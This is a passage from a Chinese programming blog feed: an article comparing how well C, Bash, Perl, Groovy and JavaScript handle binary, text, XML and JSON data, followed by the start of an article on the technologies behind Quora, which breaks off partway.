<p><span style="font-family: 'Lucida Console';">在偏底层的操作系统、嵌入式和通信系统中，二进制的字节块是最常见的一种数据格式。二进制数据布局紧凑和接近机器的特点使得它常常作为系统间通信或系统文件的数据格式，但一般高级语言都不方便直接和0101打交道，而是基于记录、结构体和类等结构化表示操作数据，这就存在着在底层的二进制字节块和高层的结构化数据直接的转换问题。</span></p>
<p><span style="font-family: 'Lucida Console';"><span id="more-4905"></span><br>
</span></p>
<p><span style="font-family: 'Lucida Console';">C语言作为最主要的系统语言具有很高的字节块数据亲和力。这不仅因为C语言具有指针可以直接访问内存以外，还因为C的结构体(struct)可以和字节块建立起直接的映射关系。例如，在基于Socket连接的分布式系统中服务器端和客户端通过二进制的字节数据进行通信，通信双方只要事先定义共用的结构体，发送方先创建相应的结构体变量并填充字段，然后把变量对应的内存块copy到Socket，接收方从Socket读取字节块，然后把字节块强制类型转换为相应的结构体指针即可读取个字段信息。整个过程中通信的双方都没有复杂的信息编码和解码的过程。示例代码如下：</span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct t_data {
    int version;
    char type[10];
    float value;
};

//发送方
struct t_data data;
data.version = 1;
strcpy(data.type,  “degree”);
data.value = 189.0;
send(socket,  &amp;data,  sizeof(data));

//接收方
struct t_data data;
read(socket,  &amp;data,  sizeof(data));
printf(“%d, %s, %f”, data.version,  data.type, data.value);</pre>
<p> </p>
<p><span style="font-family: 'Lucida Console';">上面的方法在实际应用中还需要注意内存对齐问题和大小端问题。内存对齐问题可以通过编译器预处理命令来进行控制，保证内存中struct结构与传输的字节块具有相同的对齐方式；大小端问题需要通信的双方采用同样的大小端方式，否则就需要进行转换。</span></p>
<p><span style="font-family: 'Lucida Console';">C++可以完全兼容C的结构体，但C++的类(包括class和struct)中如果定义了虚函数，则会丧失结构的字节块数据亲和力，这是C++编程时需要权衡的一个因素。而除了C/C++，其他语言中则难以见到字节块数据亲和力，其原因在于C/C++允许控制结构体/对象的内存布局，并允许对指针进行非类型安全的强制类型转换，这都是在Java，C#等语言中不允许的。所以，在Java、C#中进行字节块的编码解码就只能按照协议一个字段一个字段地按偏移量和长度进行解析。C/C++的指针以及结构体和内存的直接映射带来了对字节块数据的亲和力，但同时也留下了内存访问和类型安全的隐患；而Java、C#在拥有引用安全和类型安全的同时也失去了对字节块数据的亲和力。</span></p>
<p> </p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F"></span><span style="font-family: 'Lucida Console';"><strong>文本格式</strong> </span><span class="ez-toc-section-end"></span>
</h4>
<p><span style="font-family: 'Lucida Console';">文本格式是另一种十分常见的数据格式。《Unix编程艺术》中是这样描述文本格式的：”Text streams are a valuable universal format because they’re easy for human beings to read, write, and edit without specialized tools ”。基于文本流的管道处理是一种备受赞誉的Unix风格。Shell可以通过管道把各种功能单一的命令串联起来，让文本流在管道上流动，因而Shell语言具有很好的文本数据亲和力。许多文本数据处理任务Bash都可以一行搞定，这就是Hacker们酷爱的One Liner风格。</span></p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">下面我们来看两个用Bash进行文本处理的例子：</span></p>
<p><span style="font-family: 'Lucida Console';">1. 统计当前目录下的gz文件数目：</span></p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">ls –l *.gz | wc –l</code></p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">2. 在Web服务器日子service.log中统计2011年6月26和27两天中每天中各页面的PV</span></p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">cat service.log | grep ^2011-06-2[6-7] | cut –d ‘ ‘ –f 1, 3 | sort | uniq –c</code></p>
<p> </p>
<p>service.log:</p>
<p style="padding-left: 30px;"><span style="font-family: 'Lucida Console';">2011-06-25 13:00:55 /music/c.htm Safari<br>
…<br>
2011-06-26 08:01:23 /main.htm IE<br>
2011-06-26 08:03:01 /sports/b.htm Chrome<br>
…<br>
2011-06-27 11:41:06 /main.htm IE<br>
2011-06-27 11:52:41 /news/a.htm Firefox</span></p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">输出:</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'Lucida Console';">210 2011-06-26 /main.htm<br>
231 2011-06-26 /news/a.htm<br>
155 2011-06-26 /sports/b.htm<br>
288 2011-06-27 /main.htm<br>
292 2011-06-27 /news/a.htm<br>
161 2011-06-27 /sports/b.htm</span></p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">上面的两个简单文本数据处理任务如果是在C或C++下实现则要麻烦得多，代码量至少是十几行或者数十行，加上编译调试，整个开发效率可能比Shell低一个数量级。除了Shell外，Perl也是以强大的文本数据处理而闻名的。我们来看一个Perl正则表达式的例子：</span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">while (&lt;STDIN&gt;) {
    if (/hello\s(\w+)/i)  {
        print “say hello to $1“
     }
     elsif (/goodbye\s(\w+)/i)  {
         print “say goodbye to  $1”
    }
}</pre>
<p><span style="font-family: 'Lucida Console';">输入：</span></p>
<p style="padding-left: 30px;">HeLLo world</p>
<p style="padding-left: 30px;">Goodbye bug</p>
<p><span style="font-family: 'Lucida Console';">输出：</span></p>
<p style="padding-left: 30px;">say hello to world</p>
<p style="padding-left: 30px;">say goodbye to bug</p>
<p><span style="font-family: 'Lucida Console';">上面的例子中我们看到Perl直接进行字符串匹配并进行数据提取的强大威力。Perl基于正则表达式的字符串处理不仅比C/C++等系统语言更强大，甚至比Python这样的动态语言也更强大和更方便，这是因为正则表达式是Perl语言的“一等公民”，这就使得Perl比其他以库的方式支持正则表达式功能的语言具有更好的文本数据亲和力。后来的Ruby也学习Perl把直接在语言上支持正则表达式。</span></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F"></span><strong><span style="font-family: 'Lucida Console';">结构化文本格式</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p><span style="font-family: 'Lucida Console';">XML是最近十几年来流行起来的一种通用（半）结构化的文本数据交换格式。XML除具有一般文本格式的优点外，还具有表达复杂的层次信息的优势，所以它至诞生以来就被大量用于配置文件和各种Web Service中。现代程序设计基本都少不了了XML打交道，不过在C++、Java和C#集中静态类型语言中处理XML却并不是一件十分轻松的事情。我们先来看一个Java解析和构建下面这个XML的例子：</span></p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;langs type="current"&gt;
  &lt;language&gt;Java&lt;/language&gt;
  &lt;language&gt;Groovy&lt;/language&gt;
  &lt;language&gt;JavaScript&lt;/language&gt;
&lt;/langs&gt;</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">//Java解析XML
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
try {
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse("src/languages.xml");
    Element langs = doc.getDocumentElement();
    System.out.println("type = " + langs.getAttribute("type"));
    NodeList list = langs.getElementsByTagName("language");
    for(int i = 0 ; i &amp;lt; list.getLength();i++) {
        Element language = (Element) list.item(i);
        System.out.println(language.getTextContent());
    }
}catch(Exception e) {
    e.printStackTrace();
}

//Java创建XML
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
try {
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.newDocument();
    Element langs = doc.createElement("langs");
    langs.setAttribute("type", "current");
    doc.appendChild(langs);

    Element language1 = doc.createElement("language");
    Text text1 = doc.createTextNode("Java");
    language1.appendChild(text1);
    langs.appendChild(language1);

    Element language2 = doc.createElement("language");
    Text text2 = doc.createTextNode("Groovy");
    language2.appendChild(text2);
    langs.appendChild(language2);
    Element language3 = doc.createElement("language");
    Text text3 = doc.createTextNode("JavaScript");
    language3.appendChild(text3);
    langs.appendChild(language3);
} catch (Exception e) {
    e.printStackTrace();
}</pre>
<p><span style="color: #800040; font-family: 'Lucida Console';"><br>
</span> 为了解析和创建小小的一段XML代码需要编写如此冗长的Java代码，而实现同样的功能动态语言Groovy则十分简洁：</p>
<p></p>
<pre data-enlighter-language="groovy" class="EnlighterJSRAW">//Groovy解析XML
def langs = new XmlParser().parse("languages.xml")
println "type = ${langs.attribute("type")}"
langs.language.each{
    println it.text()
}
//Groovy创建XML
def xml = new groovy.xml.MarkupBuilder()
xml.langs(type:"current"){
   language("Java")
   language("Groovy")
   language("JavaScript")
}</pre>
<p> </p>
<p><span style="font-family: 'Lucida Console';">上面Groovy操作XML的代码简洁而富有表达力，代码与XML几乎是一一对应的，如同直接在XML上进行操作的DSL一样，而相应的Java代码则看不到XML的影子。这说明Groovy具有很高的XML数据的亲和力。为什么Java和Groovy在XML亲和力方面有这样的差异呢？原因在于Java要求所有的方法和属性都必须先定义再调用，严格的静态类型检查使得Java只能把XML元素作为“二等公民”来表达；而Groovy则没有静态类型检查的限制，可以自由地使用方法和属性来表达XML结构。上面用Groovy创建XML的例子中，groovy.xml.MarkupBuilder类中实际上并没有langs, language这些方法，但会在调用的时候自动创建相应的XML结构。</span></p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">除了XML外，JSON是另一种通用的半结构化的纯文本数据交换格式，它常被视为轻量级的XML。JSON的本意是Javascript的对象表示(Javascript Object Notation)，它属于Javascript的语法子集，所以Javascript对JSON有原生的支持。下面就是一个在Javascript中创建JSON对象的例子：</span></p>
<p>[javascript]var json = { “langs” :<br>
{<br>
"type” : "current”,<br>
"language” : ["Java”, "Groovy”, "Javascript”]<br>
}<br>
}[/javascript]</p>
<p><span style="font-family: 'Lucida Console';">许多Javascript程序都会通过AJAX都从服务器获取JSON字符串，然后把字符串解析为JSON对象。由于Javascript对JSON的原生支持，所以，在Javascript中解析JSON字符串可以采用通用的eval方式，如：</span></p>
<p>[javascript]var json = eval(“(" + jsonStr + “)");</p>
<p>alert(json.langs.type);[/javascript]</p>
<p><span style="font-family: 'Lucida Console';">甚至可以：</span></p>
<p>[javascript]eval(“var json = ” + jsonStr);</p>
<p>alert(json.langs.type);[/javascript]</p>
<p> </p>
<p><span style="font-family: 'Lucida Console';">不过eval的通用性带来了一定的安全隐患，所以一般只建议对受信任的数据源采用eval方式解析JSON，对于不受信任的数据源可以采用专门的JSON解析库。无论如何Javascript对JSON的原生支持都使得Javascript创建和解析JSON数据十分的简单，也就是说Javascript具有很高的JSON数据亲和力。另外，Groovy 1.8也加入了对JSON的原生支持，操作JSON与Javascript一样方便。</span></p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span><strong><span style="font-family: 'Lucida Console';">总结</span></strong><span class="ez-toc-section-end"></span>
</h4>
<p><span style="font-family: 'Lucida Console';">到这里为止本文篇幅已经很长了，只能列举二进制字节块格式、文本格式和结构化文本格式3种典型的数据格式。实际上，数据亲和力的话题还有很多值得探讨的，比如C#的Linq。本文的探讨算是抛砖引玉，目的在于引起大家注意在比较语言的时候不要忽略了数据亲和力这样一个重要方面。本文的错误或不足，敬请指正，谢谢！</span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7992.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_title">C++的坑真的多吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5576.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_title">那些曾伴我走过编程之路的软件</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4905" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="86cfc1b676">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>21</strong> 人打了分，平均分： <strong>4.62</strong> )<br><span class="post-ratings-text" id="ratings_4905_text"></span><meta itemprop="name" content="语言的数据亲和力">
<meta itemprop="headline" content="语言的数据亲和力">
<meta itemprop="description" content="[ 感谢 Todd 同学投递本文 ]

目前，程序设计语言似乎进入了一个蓬勃发展的时期，Javascript、Perl、Python、Ruby、Groovy等一批较新的语言正越来越多地被熟悉和使用，而C++、C#、Java等主流语言也在不断地融入函数式和动态性特征。程序员的百宝箱中可供选择的宝贝是越来多了，而社区中关于语言间的比较和争论也更为热烈，我们常常见到关于“面向过程和面向对象的比较”、...">
<meta itemprop="datePublished" content="2011-06-29T08:10:44+08:00">
<meta itemprop="dateModified" content="2011-08-15T16:24:10+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4905.html">
<meta itemprop="author" content="Todd">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4905.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.62">
<meta itemprop="ratingCount" content="21">
</div>
</div>
<div id="post-ratings-4905-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-29T08:10:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/4905.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Quora使用到的技术 ]]></title>
<link>https://coolshell.cn/articles/4939.html</link>
<content><![CDATA[ 
<p>以前向大家介绍过<a title="Stack Exchange 的架构" href="https://coolshell.cn/articles/3721.html" target="_blank">Stack Exchange的系统架构</a>和<a title="Facebook 的系统架构" href="https://coolshell.cn/articles/4549.html" target="_blank">Facebook的系统架构</a>，今天和大家说说Quora的。本文主要参考了<a title="Phil Whelan" href="http://www.philwhln.com/author/admin/">Phil Whelan</a>的这篇文章《<a href="http://www.philwhln.com/quoras-technology-examined" target="_blank">Quora’s Technology Examined</a>》。关于Quora是个什么网站我就不多说了，国内对他的C2C网站叫“知乎”。呵呵。我们还是来看看Quora的技术吧。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Search-Box" title="Search-Box">Search-Box</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%AE%9E%E6%97%B6%E6%9F%A5%E8%AF%A2" title="实时查询">实时查询</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Webnode2_%E5%92%8C_LiveNode" title="Webnode2 和 LiveNode">Webnode2 和 LiveNode</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Amazon_Web_Service" title="Amazon Web Service">Amazon Web Service</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#HAProxy_Load-Balancing" title="HAProxy Load-Balancing">HAProxy Load-Balancing</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Python" title="Python">Python</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Thrift" title="Thrift">Thrift</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Tornado" title="Tornado">Tornado</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Long_Polling_Comet" title="Long Polling (Comet)">Long Polling (Comet)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#MySQL" title="MySQL">MySQL</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Memcached" title="Memcached">Memcached</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Git" title="Git">Git</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#JavaScript_Placement" title="JavaScript Placement">JavaScript Placement</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#Charlie_Cheever_%E9%81%B5%E4%BB%8E_14_Rules_for_Faster-Loading_Web_Sites" title="Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”">Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Search-Box"></span>Search-Box<span class="ez-toc-section-end"></span>
</h4>
<p>Quora只能搜索问题，主题标签，用户名，和主题标题。没有全文搜索，所以，你无法搜索问题和答案的内容。而搜索中使用前缀搜索方式，比如你输入mi，则Microsoft会马上出来。其搜索还会有一些非常简单的模糊匹配的算法。另外，如果有重复的问题，其中一个问题会自动跳转到另一个问题，但是在搜索中还是会出现。搜索中没有拼写检查。</p>
<p>一开始，他们使用的是一个开源的搜索服务器，叫<a href="http://sphinxsearch.com/">Sphinx</a>。其支持上述的那些功能。现在他们不用这个技术了，因为<a href="https://www.quora.com/What-is-the-best-open-source-solution-for-implementing-fast-auto-complete" target="_blank">受到了一些限制</a>。他们做了一个比较新的解决方案，这个算法由Python实现。</p>
<p><strong>参看</strong>：<a href="https://www.quora.com/What-libraries-does-Quora-use-for-search"><img alt="image placeholder" >What libraries does Quora use for search?</a></p>
<h4>
<span class="ez-toc-section" id="%E5%AE%9E%E6%97%B6%E6%9F%A5%E8%AF%A2"></span>实时查询<span class="ez-toc-section-end"></span>
</h4>
<p>Quora的查询是非常高速的，其查询请求是通过AJAX的GET请求发送的，结果返回用的是JSON数据格式，但他们解析JSON是在服务器端，而不是通过浏览器的javascript。这么做的原因可能是他们想高亮搜索关键词，似乎使用Client端的Javascript非常不好做。</p>
<p>Quora的即时搜索好像比较暴力，如果你输入Microsoft（一共9个字符），你会看到其会像后端发送9次查询——每按一个键一次，无论你敲这个单词的速底有多快，每输入一个字符都会发一个请求给后台。对于这样的看上去没有效率的对后台的请求，后台的服务器端会来控制相关的前台请求，所以，就算是前台这样做，也不会增加服务器端的负载，因为后台会做相关的处理。</p>
<p>Quora的搜索使用HTTP长连接，当你开始敲查询的时候，连接就建立了，这个连接会持续在那里，你下次搜索的时候会继续使用这个连接，除非你60秒没有动作了。</p>
<p><strong>参看</strong>：<a href="https://www.quora.com/Quora-product/Is-Quora-going-to-implement-full-text-search"><img alt="image placeholder" >Is Quora going to implement full-text search?</a></p>
<p><span id="more-4939"></span></p>
<h4 id="webnode2-and-livenode">
<span class="ez-toc-section" id="Webnode2_%E5%92%8C_LiveNode"></span>Webnode2 和 LiveNode<span class="ez-toc-section-end"></span>
</h4>
<p>Webnode2 和 LiveNode 是 Quora 内部的系统，其用来管理内容。Webnode2  生成 HTML, CSS 和 JavaScript 并且和 LiveNode 紧紧地耦合在一起，Webnode2主要是用来管理内容在网页上显示的，LiveNode主要是用来做动态网页内容更新的。Charlie Cheever 说，如果他可以从新开始，他 <a href="https://www.quora.com/What-limitations-has-Quora-encountered-due-to-LiveNode-WebNode#answers" target="_blank">第一件事要做的就是重写整个LiveNode</a>.</p>
<p>Quora的工程师看上去对他们搞的这些东西非常的满意，并且 <a href="https://www.quora.com/What-limitations-has-Quora-encountered-due-to-LiveNode-WebNode#answers">他们也在努力地找到这些东西的弱点</a>。有一个有意思的关于LiveNode的问题是，如果A和B同时正在看相当的一个问题，那么用户A的一些交互动作会影响B的页面。例如，如果A顶了一下某个答案，那么这个答案可能会往上移动。这样的一个显示变化会通过AJAX更新B的浏览器。如果B此时展开了评论，可能会受到影响。</p>
<p><a href="https://www.quora.com/What-is-LiveNode-written-in">LiveNode 由这些东西写成：</a>Python, C++, and JavaScript. <a href="https://jquery.com/">jQuery</a> ，<a href="http://cython.org/">Cython</a>也用到了。</p>
<p>因为Quora <a href="https://www.quora.com/Is-Quora-planning-on-open-sourcing-LiveNode">想要对他们的LiveNode开源</a> 并准备把他们的代码分开，做这个事可能需要太多的工作和时间。</p>
<p>Charlie Cheever 指出 WebNode2 和 <a href="https://www.quora.com/Quora-Infrastructure/What-is-webnode2">有一个叫做 “free and easy website builder” 的 Webnode 的 webnode.com</a> 没有任何的关系。</p>
<p><strong>参考</strong>：<a href="https://www.quora.com/Quora-product/Is-Quora-going-to-implement-full-text-search"><img alt="image placeholder" ></a> <a href="https://www.quora.com/Shreyes-Seshasai/Tech-Talk-Webnode2-and-LiveNode" target="_blank">Tech Talk – Webnode2 and LiveNode</a></p>
<h4>
<span class="ez-toc-section" id="Amazon_Web_Service"></span>Amazon Web Service<span class="ez-toc-section-end"></span>
</h4>
<p>Quora全部host在AWS的EC2和S3上，这对于这些刚刚起步的快速发展的公司非常关键，因为你可以省去了很多硬件和维护的成本。（建一个数据中心并不是所有公司都能干的事）。Quora的操作系统使用Ubuntu Linux，这是非常容易部署和管理。</p>
<p>其静态页使用了Amazon的CDN的 <a href="https://aws.amazon.com/cloudfront/" target="_blank">Cloudfront</a>服务分发，CloudFront用于所有的静态图片, CSS 和JavaScript。<a href="https://www.quora.com/How-is-Quora-doing-image-uploads-to-Amazon-S3" target="_blank">图片先传到 EC2 服务器</a>，使用 <a href="https://aws.amazon.com/code/134" target="_blank">Pyhon S3 <acronym title="Application Programming Interface ">API</acronym></a> 处理后后传到 S3。</p>
<h4 id="haproxy-load-balancing">
<span class="ez-toc-section" id="HAProxy_Load-Balancing"></span>HAProxy Load-Balancing<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://haproxy.1wt.eu/" target="_blank">HAProxy </a>作为前端负载均衡服务器，反向代理服务器是 Nginx，Nginx 后面则是 Pylons (<a href="http://spacepants.org/blog/pylons-paste-stack">Pylons + Paste</a>) , 承担动态 Web 请求。</p>
<p><a href="http://pylonshq.com/">Pylons</a>，是一个轻量级的Web框架，通常都是在Nginx后面使用。选用Pylons就像你在春节先饺子当主食一样。他们把Pylons中的template和ORM取走而使用自己的技术（由Python写成），这个地方就是 <a href="https://www.quora.com/What-languages-and-frameworks-were-used-to-code-Quora">LiveNode 和 WebNode2的地方</a>。</p>
<h4>
<span class="ez-toc-section" id="Python"></span>Python<span class="ez-toc-section-end"></span>
</h4>
<p>从facebook出来的Charlie 和 Adam选用了Python而不是PHP。正如Adam指出的——“<a href="https://www.quora.com/Why-did-Quora-choose-Python-for-its-development">Facebook is stuck on that for legacy reasons, not because it is the best choice right now</a>”（Facebook使用PHP并不是因为其好，而是因为历史原因的问题），当然他们也不会使用C#，因为那样一来就会引入一堆微软的东西。当然，也不会是Java，因为Python要比Java更容易写出代码，Scala太年轻了，还需要考验。Ruby看上来很像Python，但是他们对Ruby没有过多的经验。最终还是Python胜出。当然，他们知道Python的弱点是性能和速度，所以，他们在需要速度和性能的地方使用了C/C++。 他们使用Python的版本是2.6。</p>
<p>使用Python的另一个原因是Python的数据结构和JSON可以很好的映射起来。代码易读性很高。而且有很多的库，调试器和重载器。Quora的B/S结构几乎完全通过JSON进行数据交互。</p>
<p>他们<a href="https://www.quora.com/Adam-DAngelo/What-version-of-Python-are-you-programming-in-and-what-IDE-do-you-use" target="_blank">没有使用IDE</a>，他们使用得最多的是Emacs，一看就知道这是一个个人的选择，随着他们开发团队的扩大，这个事会得到改变的。</p>
<p>另外，他们提到了<a href="http://codespeak.net/pypy/dist/pypy/doc/">PyPy</a>，一个让 Python更快更灵活的项目。</p>
<h4 id="thrift">
<span class="ez-toc-section" id="Thrift"></span>Thrift<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://incubator.apache.org/thrift/">Thrift</a> 用于后端服务器间的通讯。Thrift  服务由 C++开发。<a href="https://coolshell.cn/articles/4549.html" target="_blank">Facebook同样使用了这个技术</a>。</p>
<p><strong>参考</strong>：<a href="https://www.quora.com/Why-would-you-write-a-Thrift-service-in-C"><img alt="image placeholder" >Why would you write a Thrift service in C++?</a></p>
<h4 id="tornado">
<span class="ez-toc-section" id="Tornado"></span>Tornado<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.tornadoweb.org/">Tornado</a> web 框架用于实时更新，其运行在Comet 服务器上，其用来处理大量的需要长时间poll和push更新的网络连接。</p>
<h4 id="long-polling-comet">
<span class="ez-toc-section" id="Long_Polling_Comet"></span>Long Polling (Comet)<span class="ez-toc-section-end"></span>
</h4>
<p>Quora的网页并不是简单的显示，每一个页面都需要更新，或是创建问题，答案和评论。所以，他们使用了Long Polling而不是传统的Polling，传统的Polling需要浏览器一端不停地重复地向服务器询问——“有更新吗？”，服务器说没有，于是过一会浏览大再问，现在呢？服务器说，还是没有，浏览器过一会又问，现在呢？服务器说，还没好。这样一来，就好像让我们的客户端放到了驾驶室里，这显然是有问题的，因为只有服务器知道什么时候会有更新。而且浏览器这么干，很快会让服务器的负载加上去。</p>
<p>Long polling 也就是我们熟知的 <a href="https://en.wikipedia.org/wiki/Comet_(programming)">Comet</a>，其让服务器来控制这些事，让客服端等在那里听服务器的响应。在client和 server的会话对于两者是是相同的，而不是client需要等着然后向服务器查询。服务器端可以把一个连接打开很长时间（比如：60秒），在这段时间里，服务器会查看是否有相应的东西需要更新，如果有的话，就发给浏览器。如果没有的话，就等下一次的client询问。可见，这种服务器等一会再响应的方法可以让浏览器少发几次查询。</p>
<p>对于long-polling 的最好的地方是，可以降低浏览器和客户端间来来回回的次数。让服务器端来控制时间，所以，内容更新可能会只是几个毫秒，或是几十秒。 服务器端也可以积攒一堆更新后，一次发给浏览器。这样做会更有效率。</p>
<p>但是，这个方法的黑暗面是——这会让服务器端出现大量的TCP链接，想一想，Quora也是百万级用户的应用了，只需要10%的在线用户，你就需要一个可以处理10万并发量的架构。注意，如果一个用户在其浏览器里打开了多个Quora网页的话，那么，这个链接器会是非常致命的。</p>
<p>当然，好的消息是已经有一些技术专门为Long Polling设计，这些技术可以让你在那些等待的连接中只会消耗非常非常少的内存（因为那些等待连接并不需要所有的资源）。例如：Nginx 是一个单线程的事件驱动的小型服务器，每一个链接只花非常小的内存。每一个Nginx的进程只会在一个时候处理一个连接。这意味着其很容易扩展成一个可以处理成千上的并发量的服务架构。</p>
<p><strong>参考</strong>：<a href="https://www.quora.com/How-do-you-push-messages-back-to-a-web-browser-client-through-AJAX-Is-there-any-way-to-do-this-without-having-the-client-constantly-polling-the-server-for-updates"><img alt="image placeholder" >How do you push messages back to a web-browser client through AJAX? Is there any way to do this without having the client constantly polling the server for updates?</a></p>
<h4 id="mysql">
<span class="ez-toc-section" id="MySQL"></span>MySQL<span class="ez-toc-section-end"></span>
</h4>
<p>就像Adam D’Angelo 的老东家facebook一样，，Quora重度使用MySQL。对于，把数据库里的数据分区是最需要做的事。他们的行事原则是，尽可能的把数据放在一台机器上，使用hash主键把大规模的数据存放到多个数据库中。坚决不用表连接。Adam参考了FriendFeed的一篇文章<a href="https://bret.appspot.com/entry/how-friendfeed-uses-mysql">How FriendFeed uses MySQL to store schema-less data</a>，<a href="https://www.quora.com/NoSQL/In-what-parts-of-a-social-site-with-concert-listings-should-one-use-a-NoSQL-DB-versus-a-SQL-DB">并说</a>你不应该在你的社区还没有100万用户的时候使用NoSQL 数据库。</p>
<p>并不只是Quora和FriendFeed使用MySQL，Google，Twitter，Facebook都在使用MySQL.</p>
<p>参考：<a href="https://www.quora.com/How-does-one-evaluate-if-a-database-is-efficient-enough-to-not-crash-as-its-put-under-increasing-load"><img alt="image placeholder" >How does one evaluate if a database is efficient enough to not crash as it’s put under increasing load?</a></p>
<h4 id="memcached">
<span class="ez-toc-section" id="Memcached"></span>Memcached<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://memcached.org/">Memcached</a> 用于 MySQL的前端缓存。</p>
<h4 id="git">
